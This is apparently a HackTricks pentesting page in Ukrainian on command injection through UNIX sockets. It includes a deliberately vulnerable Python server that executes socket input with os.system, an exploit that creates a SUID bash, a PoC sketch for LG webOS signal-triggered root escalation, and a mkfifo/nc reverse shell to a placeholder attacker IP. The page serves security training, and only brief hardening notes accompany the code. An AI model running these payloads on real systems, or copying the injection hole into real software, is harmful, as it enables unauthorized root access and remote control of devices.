# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding приклад з Python

У наступному прикладі **unix socket створюється** (`/tmp/socket_test.s`), і все, що **отримується**, буде **виконане** за допомогою `os.system`. Я знаю, що ви навряд чи знайдете це в реальному житті, але мета цього прикладу — побачити, як виглядає код, що використовує unix sockets, і як обробляти вхідні дані у найгіршому можливому випадку.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Виконайте** код за допомогою python: `python s.py` і **перевірте, як socket слухає**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Кейс: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Деякі привілейовані демони відкривають root-owned UNIX socket, який приймає ненадійний ввід і пов'язує привілейовані дії з thread-IDs та signals. Якщо протокол дозволяє непривілейованому клієнту впливати на те, який native thread буде націлений, ви можете спровокувати виконання привілейованого коду і підвищити привілеї.

Спостережуваний патерн:
- Підключитися до root-owned socket (e.g., /tmp/remotelogger).
- Створити thread і отримати його native thread id (TID).
- Відправити TID (packed) плюс padding як запит; отримати підтвердження.
- Надіслати конкретний сигнал цьому TID, щоб викликати привілейовану поведінку.

Мінімальний PoC ескіз:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Щоб перетворити це на root shell, можна використати просту схему named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
- Цей клас багів виникає через довіру до значень, отриманих із непривілейованого стану клієнта (TIDs), та прив'язку їх до привілейованих обробників сигналів або логіки.
- Посилюйте захист, застосовуючи перевірку credentials на socket, валідацію форматів повідомлень та відокремлення привілейованих операцій від зовнішньо наданих thread identifiers.

## Посилання

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
